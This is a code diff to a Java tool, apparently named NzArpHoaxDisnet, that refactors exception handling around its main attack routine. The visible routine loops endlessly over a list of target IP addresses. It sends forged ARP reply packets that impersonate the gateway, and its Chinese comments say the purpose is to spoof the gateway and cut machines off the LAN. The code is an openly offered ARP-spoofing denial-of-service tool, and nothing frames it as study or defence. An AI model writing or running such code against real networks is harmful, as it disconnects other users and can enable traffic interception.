@@ -33,14 +33,7 @@ import java.util.regex.Pattern;
 public class NzArpHoaxDisnet {
 
     public static void main(String[] args) {
-
-        // 启动方法-欺骗网关-进行局域网断网
-        try {
-            NzArpHoaxDisnet.hoaxGatewayDisnet();
-        } catch (Exception e) {
-            log.error("程序异常终止...", e);
-        }
-
+        hoaxGatewayDisnet();
     }
 
     /**
@@ -188,17 +181,20 @@ public class NzArpHoaxDisnet {
     /**
      * 启动方法-欺骗网关-进行局域网断网
      */
-    private static void hoaxGatewayDisnet() throws Exception {
-        // 启动成功
-        log.info("ArpNotDisnet starting success .............");
-        // 循环发送ARP应答包
-        while (true) {
-            for (String tarip : IPLIS) {
-                // 构造ARP包请求，并发送（MYMACARR -> 可伪造）
-                SENDER.sendPacket(constractReqArps(MYMACARR, InetAddress.getByName(tarip), GATEWAYMACARR, GATEWAYIPOBJ, 2));
+    private static void hoaxGatewayDisnet() {
+        log.info("ArpHoaxDisnet starting success .............");
+        try {
+            // 循环发送ARP应答包
+            while (true) {
+                for (String tarip : IPLIS) {
+                    // 构造ARP包请求，并发送（MYMACARR -> 可伪造）
+                    SENDER.sendPacket(constractReqArps(MYMACARR, InetAddress.getByName(tarip), GATEWAYMACARR, GATEWAYIPOBJ, 2));
+                }
+                // 休息 TIME 秒
+                Thread.sleep((long) (TIME * 1000));
             }
-            // 休息 TIME 秒
-            Thread.sleep((long) (TIME * 1000));
+        } catch (Exception e) {
+            log.error("ArpHoaxDisnet exception termination .............", e);
         }
     }
 
